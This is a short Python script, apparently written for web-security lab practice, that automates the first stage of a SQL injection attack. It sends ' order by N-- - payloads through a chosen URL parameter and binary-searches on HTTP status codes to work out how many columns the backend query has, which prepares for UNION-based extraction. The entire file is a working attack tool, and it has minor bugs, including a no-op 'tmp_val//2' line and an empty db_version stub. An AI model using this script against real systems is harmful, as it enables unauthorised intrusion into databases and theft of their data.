import urllib
import argparse
import requests
from colorama import Style, Fore


class Columns:
    __url: str | None = None
    __param: str | None = None
    __amount: int | None = None

    def __init__(self, url, param, amount):
        self.__url = url
        self.__param = param
        self.__amount = amount
        self.run()

    def run(self):
        print(self.encode_url(10))
        self.binary_search()

    def db_version(self):
        pass  

    def encode_url(self, counter) -> str:
        return f"{self.__url}filter?{self.__param}=" + urllib.parse.quote("' order by ") + f"{counter}" + urllib.parse.quote("-- -")

    def make_request(self, counter) -> int:
        response = requests.get(self.encode_url(counter))
        return response.status_code

    def binary_search(self):
        tmp_val = self.__amount//2
        while True:
            status_code = self.make_request(self.__amount)
            print(f"Status code: {status_code}\nAmount: {self.__amount}\nTmp_val: {tmp_val}\n")
            if status_code != 200:
                tmp_val = 1 if tmp_val//2 == 0 else tmp_val//2
                self.__amount -= tmp_val
            else:
                if self.make_request(self.__amount+1) == 500:
                    print(Fore.GREEN, f"[+] Amount of columns: {self.__amount}", Style.RESET_ALL)
                    return
                else:
                    tmp_val//2
                    self.__amount += tmp_val



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Finding amount of columns. Beta version.")
    parser.add_argument("--url", "-u", type=str, nargs=1, help="Provide the url.")
    parser.add_argument("--param", "-p", type=str, nargs=1, help="Provide the param.")
    parser.add_argument("--amount", "-a", type=int, nargs=1, help="Predicted amount of columns. Has to be bigger than the actual one.")
    args = parser.parse_args()
    columns = Columns(args.url[0], args.param[0], args.amount[0])
